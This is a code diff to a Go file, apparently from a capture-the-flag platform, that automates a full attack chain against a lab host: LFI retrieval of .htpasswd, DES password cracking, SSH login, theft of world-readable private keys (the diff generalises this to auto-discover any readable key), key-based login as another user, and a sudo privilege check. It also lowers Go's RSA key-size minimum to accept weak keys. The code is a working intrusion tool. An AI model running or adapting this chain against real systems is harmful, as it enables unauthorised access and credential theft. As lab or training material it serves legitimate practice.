@@ -10,8 +10,8 @@ package ctfplatform
 //   2. loot      经 LFI 取出 .htpasswd
 //   3. crack     DES 字典破解
 //   4. ssh       口令登录拿初始 shell
-//   5. keytheft  偷世界可读的未加密 PPK 私钥
-//   6. keylogin  PPK→PEM，以目标用户私钥登录
+//   5. keytheft  自动发现世界可读的私钥（不猜用户名）
+//   6. keylogin  私钥登录（PPK 自动转 PEM）
 //   7. privesc   sudo 提权，判定是否 uid=0
 //
 // 安全：默认拒绝 insecure 主机密钥；口令/私钥只在内存传递，不进日志、不落盘。
@@ -45,7 +45,7 @@ type KillChainOptions struct {
 	BaseURL       string        // Web 入口，如 http://127.0.0.1:8080/
 	SSHAddr       string        // SSH 地址，如 127.0.0.1:2222
 	Wordlist      []string      // 候选口令（空则用内置字典）
-	TargetUser    string        // 私钥归属用户，默认 achen
+	TargetUser    string        // 可选：优先选该用户的私钥；留空则取第一个可读私钥
 	KnownUser     string        // 已知初始用户（给了就跳过破解）
 	KnownPassword string        // 已知初始口令
 	AllowInsecure bool          // 必须显式为 true（实验环境）
@@ -55,9 +55,6 @@ type KillChainOptions struct {
 // RunKillChain 执行完整链条。任何一步失败即停止，已完成步骤保留在结果里。
 func RunKillChain(ctx context.Context, opts KillChainOptions) *KillChainResult {
 	res := &KillChainResult{}
-	if opts.TargetUser == "" {
-		opts.TargetUser = "achen"
-	}
 	if opts.StepTimeout <= 0 {
 		opts.StepTimeout = 30 * time.Second
 	}
@@ -164,35 +161,45 @@ func RunKillChain(ctx context.Context, opts KillChainOptions) *KillChainResult {
 		return res
 	}
 
-	// ---------- 5. keytheft：偷私钥 ----------
-	var ppk []byte
+	// ---------- 5. keytheft：自动发现并读取可读私钥 ----------
+	var pemKey []byte
+	var keyUser string
 	if !step("keytheft", func() (string, error) {
-		cmd := fmt.Sprintf("cat /home/%s/.ssh/%s_priv.ppk 2>&1", opts.TargetUser, opts.TargetUser)
-		out, err := RunSSHCommand(ctx, opts.SSHAddr, cred.User, cred.Password, cmd, opts.AllowInsecure, opts.StepTimeout)
-		if err != nil && out == "" {
+		keys, err := FindReadableSSHKeys(ctx, opts.SSHAddr, cred.User, cred.Password, opts.AllowInsecure, opts.StepTimeout)
+		if err != nil {
 			return "", err
 		}
-		if !strings.Contains(out, "PuTTY-User-Key-File-2") {
-			return "", fmt.Errorf("/home/%s/.ssh 下无未加密 PPK 私钥", opts.TargetUser)
+		// 指定了目标用户就优先它的私钥；否则取第一个可读的（不猜用户名）
+		chosen := keys[0]
+		if opts.TargetUser != "" {
+			for _, k := range keys {
+				if k.Owner == opts.TargetUser {
+					chosen = k
+					break
+				}
+			}
 		}
-		if !strings.Contains(out, "Encryption: none") {
-			return "", fmt.Errorf("私钥已加密，本实现不支持")
+		material, err := LoadKeyMaterial(ctx, opts.SSHAddr, cred.User, cred.Password,
+			chosen.Path, opts.AllowInsecure, opts.StepTimeout)
+		if err != nil {
+			return "", err
 		}
-		ppk = []byte(out)
-		return fmt.Sprintf("取得 %d 字节未加密 PPK", len(out)), nil
+		pemKey = material
+		keyUser = chosen.Owner
+		return fmt.Sprintf("发现 %d 个可读私钥，选用 %s（属主 %s，权限 %s，PEM %d 字节）",
+			len(keys), chosen.Path, chosen.Owner, chosen.Perm, len(material)), nil
 	}) {
 		return res
 	}
 
-	// ---------- 6. keylogin：PPK→PEM 并登录 ----------
-	pemKey, _ := PPKToPEM(ppk)
+	// ---------- 6. keylogin：用私钥登录 ----------
 	if !step("keylogin", func() (string, error) {
-		acc, err := TrySSHLoginWithKey(ctx, opts.SSHAddr, opts.TargetUser, pemKey, opts.AllowInsecure, opts.StepTimeout)
+		acc, err := TrySSHLoginWithKey(ctx, opts.SSHAddr, keyUser, pemKey, opts.AllowInsecure, opts.StepTimeout)
 		if err != nil {
 			// 老靶机私钥常见 1023 位，Go 1.24+ 默认拒绝；仅实验环境放开后重试一次
 			if strings.Contains(err.Error(), "insecure") || strings.Contains(err.Error(), "1023") {
 				_ = os.Setenv("GODEBUG", "rsa1024min=0")
-				acc, err = TrySSHLoginWithKey(ctx, opts.SSHAddr, opts.TargetUser, pemKey, opts.AllowInsecure, opts.StepTimeout)
+				acc, err = TrySSHLoginWithKey(ctx, opts.SSHAddr, keyUser, pemKey, opts.AllowInsecure, opts.StepTimeout)
 				if err == nil {
 					return fmt.Sprintf("%s（已放开 rsa1024min 以接受老密钥）：%s", acc.User, acc.WhoAmI), nil
 				}
@@ -206,7 +213,7 @@ func RunKillChain(ctx context.Context, opts KillChainOptions) *KillChainResult {
 
 	// ---------- 7. privesc ----------
 	step("privesc", func() (string, error) {
-		out, err := RunSSHCommandWithKey(ctx, opts.SSHAddr, opts.TargetUser, pemKey, "sudo id 2>&1",
+		out, err := RunSSHCommandWithKey(ctx, opts.SSHAddr, keyUser, pemKey, "sudo id 2>&1",
 			opts.AllowInsecure, opts.StepTimeout)
 		if err != nil && !strings.Contains(out, "uid=") {
 			return "", err
